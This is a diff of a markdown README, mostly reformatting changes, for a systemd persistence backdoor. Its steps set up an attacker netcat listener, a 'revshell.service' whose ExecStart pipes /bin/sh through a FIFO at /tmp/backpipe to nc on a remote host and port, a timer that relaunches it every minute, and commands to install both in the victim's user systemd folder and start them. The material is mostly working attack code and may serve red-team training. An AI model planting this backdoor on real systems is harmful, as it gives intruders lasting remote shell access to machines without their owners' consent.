@@ -6,9 +6,10 @@ This sequence of commands sets up a scheduled task, much like the better-known `
 a reverse shell using a FIFO pipe located at `/tmp/backpipe`.
 
 The service file (`revshell.service`) uses:
-  * The `Environment` directive to set up the remote host and port to connect to
-  * The `ExecStartPre` directive to check fo the FIFO pipe and create it if it does not exist
-  * The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)
+
+* The `Environment` directive to set up the remote host and port to connect to
+* The `ExecStartPre` directive to check fo the FIFO pipe and create it if it does not exist
+* The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)
 
 ## Additional Notes
 
@@ -18,10 +19,12 @@ The service file (`revshell.service`) uses:
 * Tasks will automatically run again if the backdoor ends after the next task was supposed to run
   * systemd will not wait until the timer gets scheduled again
   * e.g. 4.5 minutes after initial run on a per-minute timer
+
     ```
     [1]       [2]        [3]        [4]          [5]
     run-------skip-------skip-------skip-die-run-skip
     ```
+
 * The `.timer` file will randomize unit execution a bit based on the `AccuracySec` and `RandomizedDelaySec` directives
   * `AccuracySec` is a measure of how accurate systemd must be when executing the associated unit.
     This is done so systemd can attempt to reduce executions that fall within the same time window.
@@ -32,12 +35,15 @@ The service file (`revshell.service`) uses:
     * In reality, this unit will execute sometime between `*:56 - *:05` seconds
 
 ## Step by Step
+
 1. Stand up listener on attacker server
+
 ```sh
-$ nc -nlvp 4444
+nc -nlvp 4444
 ```
 
 2. Generate a service file to create the backdoor on the victim
+
 ```ini
 $ cat revshell.service
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
@@ -54,6 +60,7 @@ ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp
 ```
 
 3. Generate a timer file to execute the backdoor at regular intervals (every minute in our case)
+
 ```ini
 $ cat revshell.timer
 ; https://www.freedesktop.org/software/systemd/man/systemd.timer.html
@@ -66,18 +73,21 @@ Persistent=true
 ```
 
 4. Install into the systemd user folder on the victim
+
 ```sh
-$ mkdir -p ~/.config/systemd/user/
-$ ln -s `pwd`/revshell.service ~/.config/systemd/user/
-$ ln -s `pwd`/revshell.timer ~/.config/systemd/user/
+mkdir -p ~/.config/systemd/user/
+ln -s `pwd`/revshell.service ~/.config/systemd/user/
+ln -s `pwd`/revshell.timer ~/.config/systemd/user/
 ```
 
 5. Start the scheduled task
+
 ```sh
-$ systemctl --user start revshell.timer
+systemctl --user start revshell.timer
 ```
 
 6. Wait for the shell!
+
 ```sh
 $ nc -nvlp 4444
 listening on [any] 4444 ...
